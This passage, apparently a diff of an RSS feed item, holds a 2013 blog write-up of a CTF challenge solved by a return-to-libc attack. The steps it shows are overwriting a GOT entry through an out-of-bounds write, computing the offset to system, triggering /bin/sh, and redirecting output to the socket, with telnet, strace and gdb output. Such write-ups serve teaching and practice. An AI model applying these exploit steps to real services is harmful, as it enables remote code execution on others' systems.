- 8048980:	ff 25 c0 bf 04 08    	jmp    *0x804bfc0</code></pre></li>
-</ul>
-<p><strong>0x804bfc0</strong> is the GOT entry for <code>recv</code> function.</p>
-<ul>
-<li><p>finding the relative offset of the function that we want to jump to (e.g. <code>system</code>) is <strong>difficult</strong>. This offset depends on the version of libc that is used on the target system. To make things simple, we will focus first on exploiting locally - meaning that we have access to our libc file. To compute the offset we only have to find the function entries in libc.</p>
-<pre><code>$ readelf -s /lib/tls/i686/cmov/libc.so.6 | grep &#39; recv@&#39;
-  1124: 000cebf0   118 FUNC    WEAK   DEFAULT   12 recv@@GLIBC_2.0
-$ readelf -s /lib/tls/i686/cmov/libc.so.6 | grep &#39; system@&#39;
-  1398: 00039100   125 FUNC    WEAK   DEFAULT   12 system@@GLIBC_2.0
-$ echo $((0x00039100-0x000cebf0))
--613104</code></pre></li>
-</ul>
-<p>The offset is -613104, <strong>note</strong> that it depends on the version of libc, hence the exploit isn’t too reliable. Let’s focus though on exploiting locally and postpone the computation of the remote offset. We will write at the same address as in PoC1 but we will write the value of <code>system</code> function i.e. <code>address_of_recv_function+OFFSET</code>.</p>
-<pre><code>$ telnet localhost 31337
-read
-Input position to read from:
--32
-Value at position -32: -1217696784
-write
-Input position to write to:
--2147483634
-Input numeric value to write:
--1218309888
-Value at position -2147483634: -1218309888
-math
-Result of math: -1</code></pre>
-<p>Reading from <strong>-32</strong> it’s equivalent of reading -32*4 bytes before our buffer. 0x804c040-32*4 is 0x804bfc0, this is the <code>recv</code> GOT entry. <strong>-1218309888</strong> is -1217696784-613104.</p>
-<p>Hey, it didn’t crashed, that’s a plus! Meanwhile, back at the castle.</p>
-<pre><code>$ strace -f ./back2skool-3fbcd46db37c50ad52675294f566790c777b9d1f
-[...]
-[pid  4901] send(4, &quot;Value at position -2147483634: -&quot;..., 43, 0) = 43
-[pid  4901] read(4, &quot;m&quot;, 1)             = 1
-[pid  4901] read(4, &quot;a&quot;, 1)             = 1
-[pid  4901] read(4, &quot;t&quot;, 1)             = 1
-[pid  4901] read(4, &quot;h&quot;, 1)             = 1
-[pid  4901] read(4, &quot;\r&quot;, 1)            = 1
-[pid  4901] read(4, &quot;\n&quot;, 1)            = 1
-[...]
-[pid  4902] execve(&quot;/bin/sh&quot;, [&quot;sh&quot;, &quot;-c&quot;, &quot;&quot;], [/* 31 vars */]) = 0
-[pid  4902] brk(0)                      = 0x9a04000
-[...]</code></pre>
-<p>We successfully <strong>called execve</strong>!</p>
-</section>
-<section id="parameters-to-execve" class="level2">
-<h2>Parameters to execve</h2>
-<p>We are able to run <code>execve</code> but we don’t control the parameters … yet. Let’s see with what parameters <code>execve</code> is called.</p>
-<pre><code>$ gdb ./back2skool-3fbcd46db37c50ad52675294f566790c777b9d1f
-[...]
-Reading symbols from /root/back2skool-3fbcd46db37c50ad52675294f5667909d1f...(no debugging symbols found)...done.
-(gdb) set follow-fork-mode child 
-(gdb) catch syscall execve 
-Catchpoint 1 (syscall &#39;execve&#39; [11])
-(gdb) r
-[...]
-Catchpoint 1 (call to syscall &#39;execve&#39;), 0xb7fe2424 in __kernel_vsyscall ()
-(gdb) info registers 
-eax            0xffffffda	-38
-ecx            0xbffff3b4	-1073744972
-edx            0xbffff5ac	-1073744468
-ebx            0xb7fa5a5a	-1208329638
-[...]
-(gdb) x/s $ebx
-0xb7fa5a5a:	 &quot;/bin/sh&quot;
-(gdb) x/5x $ecx
-0xbffff3b4:	0xb7fa5a5f	0xb7fa5a57	0x0804c040	0x00000000
-0xbffff3c4:	0xb7ead180
-(gdb) x/s ((char **)$ecx)[0]
-0xb7fa5a5f:	 &quot;sh&quot;
-(gdb) x/s ((char **)$ecx)[1]
-0xb7fa5a57:	 &quot;-c&quot;
-(gdb) x/s ((char **)$ecx)[2]
-0x804c040 &lt;values&gt;:	 &quot;&quot;
-(gdb) </code></pre>
-<p>Because we’re using <code>system</code> function the first parameters are set accordingly (<code>sh -c</code>) but the actual command (<code>(char **)$ecx)[2]</code>) is empty. You can have a look at <code>execve</code> syscall <a href="http://www.kernel.org/doc/man-pages/online/pages/man2/execve.2.html">parameters</a> and the <a href="http://stackoverflow.com/questions/2535989/what-are-the-calling-conventions-for-unix-linux-system-calls-on-x86-64">calling convention</a> for it. Here we’re very <strong>lucky</strong>, the command that is passed to system is our buffer with values, the initial table. Let’s recap our approach:</p>
-<ul>
-<li>get the address of <code>recv</code> function via GOT</li>
-<li>set the pointer of <code>math</code> function to <code>system</code> by adding an offset to <code>recv</code> function address</li>
-<li>set the parameters in the workspace table</li>
-<li>trigger the exploit by using the <code>math</code> function</li>
-<li>profit</li>
-</ul>
-</section>
-<section id="getting-some-output" class="level2">
-<h2>Getting some output</h2>
-<p>The only problem was that the communication socket was number 4 and the output went to file descriptor 1, but running the command with <code>&gt;&amp;4 2&gt;&amp;4</code> appended, did the trick for us.</p>
-</section>
-<section id="the-offset-the-achilles-heel-of-the-exploit" class="level2">
-<h2>The offset, the Achilles’ Heel of the exploit</h2>
-<p>Well, the exploit worked locally, but remote it didn’t.</p>
-<p>Recall that when computing the offset of <code>system</code> function in respect to <code>recv</code> function, we were able to access the libc that was used on the target <code>system</code>. A few ideas appeared:</p>
-<ul>
-<li>try different offsets by gathering as many libcs as possible from well known distros. After one hour of trying all the libc binaries from Ubuntu I start to wonder if I’m on the right track.</li>
-<li>try random values - this didn’t work at all and it was time consuming (I was already tired and my thinking was bad)</li>
-<li>get a copy of in use libc - this is a problem, because we cannot do <code>open</code>, in the best case, we might do some <code>send</code> over the socket using as buffer input the libc mapping.</li>
-<li>hope for the best, and use another challenge (which we already exploited) and download that libc file and hope that this system has the same one.</li>
-<li>try to do a more intelligent search by matching function entries (<code>push   %ebp</code>, <code>mov %esp, %ebp</code> etc.), this would require too much work.</li>
-<li>use some magical tool/table that I’m not sure it exists.</li>
-</ul>
-<p>We used a <strong>previous</strong> level and was able to <strong>download</strong> the libc, this libc was identical with the one that was in use by the current challenge, so we were able to compute the offset for the remote system.</p>
-<p>I don’t know of any method of doing a reliable return-to-libc attack without knowing the addresses of some functions. Maybe there’s a method of getting all the symbols after knowing the libc base, that would be neat.</p>
-<p>The final exploit can be found <a href="res/pwn250.py">here</a>.</p>
-</section>
-</section>
-<section id="conclusion" class="level1">
-<h1>Conclusion</h1>
-<p>We’ve presented a way of doing a return-to-libc attack, even though this is a primitive return-to-libc approach, we used a function from libc. We also had to compute the offset of that function using the address of another function - this makes the exploit unreliable.</p>
-<p>In the end, it boils down to have the right skill for using the right tools, it’s nothing fancy.</p>
-</section>
-
-    </div>
-  </div>
-</div>
-]]></description>
-    <pubDate>Tue, 19 Feb 2013 00:00:00 UT</pubDate>
-    <guid>http://techblog.rosedu.org/ctf-return-to-libc.html</guid>
 </item>
 
     </channel> 
